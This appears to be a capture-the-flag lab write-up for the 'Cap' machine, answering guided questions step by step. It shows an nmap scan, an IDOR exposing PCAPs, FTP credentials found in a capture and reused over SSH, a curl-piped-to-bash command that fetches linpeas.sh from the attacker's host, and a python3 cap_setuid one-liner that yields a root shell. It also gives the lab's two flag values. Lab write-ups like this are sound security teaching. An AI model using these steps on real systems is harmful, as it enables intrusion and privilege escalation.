I used the guided mode for this machine. In this mode it has a number of questions that I must answer.
1) How many TCP ports are open?
```shell
sudo nmap 10.10.10.245 -sS -n -Pn -p-
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-18 10:43 EDT
Nmap scan report for 10.10.10.245
Host is up (0.053s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 29.57 seconds
```

Answer: 3

2) After running a "Security Snapshot", the browser is redirected to a path of the format `/[something]/[id]`, where `[id]` represents the id number of the scan. What is the `[something]`?

I go to the `10.10.10.245`:
![site](../../../attachments/Pasted%20image%2020251011203415.png)

I go to `Security Snapshot` and I see:
![securitysnapshot](../../../attachments/Pasted%20image%2020251018175033.png)

Answer: data

3) Are you able to get to other users' scans?

In the data/{id} I can change the id and see other users' scans.
This is called Insecure Direct Object Reference (IDOR).

Answer: yes

4) What is the ID of the PCAP file that contains sensitive data?

I checked different ids and I downloaded the PCAP files and opened them in WireShark. The one that had sensitive data was id 0. It had a FTP stream and if we right click and select "Follow"->"TCP Stream":

![sdasa](../../../attachments/Pasted%20image%2020251018184358.png)

we will see the whole dialogue and we see the username "nathan" with the password "Buck3tH4TF0RM3!"
![dsasdaa](../../../attachments/Pasted%20image%2020251018184518.png)

Answer: 0

5) Which application layer protocol in the pcap file can the sensetive data be found in?

Answer: FTP

6) We've managed to collect nathan's FTP password. On what other service does this password work?

We try to connect via ssh:
```shell
ssh nathan@10.10.10.245
```

and we are able to connect.

![5](../../../attachments/Pasted%20image%2020251018184816.png)

Answer: SSH

7) Submit the flag located in the nathan user's home directory.

![6](../../../attachments/Pasted%20image%2020251018184911.png)

**Answer: f447ce687556e50df8b0e21535898aa0**


8) What is the full path to the binary on this machine has special capabilities that can be abused to obtain root privileges?

In order to find more information about privilege escalation I run LinPeas.sh:

In the kali machine I create a directory /www
```shell
mkdir www
cd www
cp /usr/share/peass/linpeas/linpeas.sh .
sudo python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

In the vulnerable machine I run this command:
```shell
curl 10.10.14.118:8000/linpeas.sh | bash
```
and then linpeas.sh will run

After it is finished I check the lines that are in RED/YELLOW legend.

![7](../../../attachments/Pasted%20image%2020251018192759.png)

first I find this CVE and I try to exploit it but I could't do it, so I try to find another line and I find this:

![8](../../../attachments/Pasted%20image%2020251018193004.png)

So the privilege escalation will happen using Capabilities. A site, which helped me with this section, is the [following](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/) 

```shell
getcap -r / 2>/dev/null
```
```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

```shell
which python3
/usr/bin/python3
```

```shell
nathan@cap:/usr/bin$ ./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
\root@cap:/usr/bin# id
uid=0(root) gid=1001(nathan) groups=1001(nathan)

```

Answer: /usr/bin/python3.8

9) Submit the flag located in root's home directory.

![9](../../../attachments/Pasted%20image%2020251018195427.png)

Answer: bd58ab7567dcfa4a9aaea9dee4d6af8b
